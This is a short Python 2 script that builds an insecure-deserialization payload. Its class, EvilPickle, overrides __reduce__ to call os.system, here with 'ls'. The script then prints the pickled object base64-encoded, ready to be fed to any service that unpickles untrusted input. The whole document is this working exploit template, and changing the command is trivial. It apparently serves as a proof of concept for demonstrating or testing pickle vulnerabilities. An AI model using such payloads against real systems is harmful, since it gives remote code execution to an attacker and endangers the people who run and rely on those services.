import cPickle
import subprocess
import base64
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('ls', ))

print (base64.b64encode(cPickle.dumps(EvilPickle())))